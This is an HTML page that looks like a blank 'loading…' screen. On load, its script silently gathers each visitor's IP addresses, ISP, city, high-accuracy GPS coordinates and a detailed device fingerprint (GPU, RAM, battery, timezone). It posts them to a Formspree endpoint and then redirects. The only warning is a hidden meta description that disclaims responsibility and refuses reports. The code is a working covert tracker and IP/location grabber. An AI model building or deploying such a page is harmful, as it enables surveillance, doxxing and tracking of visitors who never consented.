<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="WARNING: This website is strictly for learning and educational purposes. By accessing this page, you acknowledge that your device information and your location will be visible. I Ituze Bonheur assumes no responsibility for the data displayed or collected, and no reports regarding this site will be accepted or entertained.">
    <title>loading…</title>
    <link rel="icon" href="images/ituze.png" type="image/png">
</head>
<body>
<script>

const CONFIG = {
    ENDPOINT: "https://formspree.io/f/maqpoaly",
    REDIRECT: "https://www.ituzebonheur.com"
};

async function getNetworkAndGeo() {
    const netData = { ipv4: "Not Detected", ipv6: "Not Detected", isp: "Unavailable", geo: "Unavailable" };
    try {
        const [res4, res6, resGeo] = await Promise.all([
            fetch("https://api.ipify.org?format=json").then(r => r.json()).catch(() => null),
            fetch("https://api6.ipify.org?format=json").then(r => r.json()).catch(() => null),
            fetch("https://ipapi.co/json/").then(r => r.json()).catch(() => null)
        ]);

        if (res4) netData.ipv4 = res4.ip;
        if (res6) netData.ipv6 = res6.ip;
        if (resGeo) {
            netData.isp = resGeo.org;
            netData.geo = `${resGeo.city}, ${resGeo.country_name}`;
        }
    } catch (e) {}
    return netData;
}

async function getGPS() {
    return new Promise(resolve => {
        if (!navigator.geolocation) return resolve({ lat: null, lon: null, accuracy: null });
        navigator.geolocation.getCurrentPosition(
            p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, accuracy: p.coords.accuracy }),
            () => resolve({ lat: "Denied", lon: "Denied", accuracy: null }),
            { enableHighAccuracy: true, timeout: 5000 }
        );
    });
}

function getHardwareInfo() {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    let gpu = "Unknown";
    if (gl) {
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Software";
    }

    return {
        gpu: gpu,
        threads: navigator.hardwareConcurrency || "n/a",
        ram: navigator.deviceMemory || "n/a",
        touch: navigator.maxTouchPoints > 0
    };
}

function getOS() {
    const ua = navigator.userAgent;
    if (/Android/i.test(ua)) return "Android";
    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
    if (/Windows Phone/i.test(ua)) return "Windows Phone";
    if (/BlackBerry|BB10/i.test(ua)) return "BlackBerry";
    if (ua.includes("Windows NT")) return "Windows";
    if (ua.includes("Mac OS")) return "MacOS";
    if (ua.includes("CrOS")) return "ChromeOS"; 
    if (ua.includes("Linux")) return "Linux";
    if (ua.includes("FreeBSD")) return "FreeBSD";
    if (ua.includes("OpenBSD")) return "OpenBSD";
    if (ua.includes("NetBSD")) return "NetBSD";
    if (ua.includes("SunOS")) return "Solaris";
    return "Unknown OS";
}

async function collect() {
    const [net, gps, hardware] = await Promise.all([getNetworkAndGeo(), getGPS(), getHardwareInfo()]);

let batteryStatus = "n/a";
if (navigator.getBattery) {
    const b = await navigator.getBattery();
    const level = Math.round(b.level * 100);
    const state = b.charging ? "Charging" : "Discharging";
    batteryStatus = `${level}% (${state})`;
}
    const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
    const reducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;

    const payload = {
        "userAgent": navigator.userAgent,
        "platform": getOS(),
        "language": navigator.language,
        "languages": navigator.languages,
        "screen": {
            "touchscreen": hardware.touch,
            "resolution": `${window.screen.width}x${window.screen.height}`,
            "pixelRatio": window.devicePixelRatio,
            "colorDepth": window.screen.colorDepth
        },
        "timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
        "cookiesEnabled": navigator.cookieEnabled,
        "storage": {
            "localStorage": !!window.localStorage,
            "sessionStorage": !!window.sessionStorage,
            "indexedDB": !!window.indexedDB
        },
        "network": {
            "IPv4": net.ipv4,
            "IPv6": net.ipv6,
            "isp": net.isp,
            "downlink": navigator.connection?.downlink || null,
            "rtt": navigator.connection?.rtt || null,
            "effectiveType": navigator.connection?.effectiveType || null
        },
        "referrer": document.referrer || "Direct",
        "cpuThreads": hardware.threads,
        "ram": hardware.ram,
        "GPU": hardware.gpu,
        "darkMode": darkMode,
        "reducedMotion": reducedMotion,
        "battery": batteryStatus,
        "dnt": navigator.doNotTrack || "Off",
        "location": gps,
    };

    return payload;
}

async function init() {
    const data = await collect();
    
    try {
        await fetch(CONFIG.ENDPOINT, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
    } catch (e) {
        console.error("Transmission bypass");
    } finally {
        window.location.replace(CONFIG.REDIRECT);
    }
}

window.onload = init;
</script>
</body>
</html>
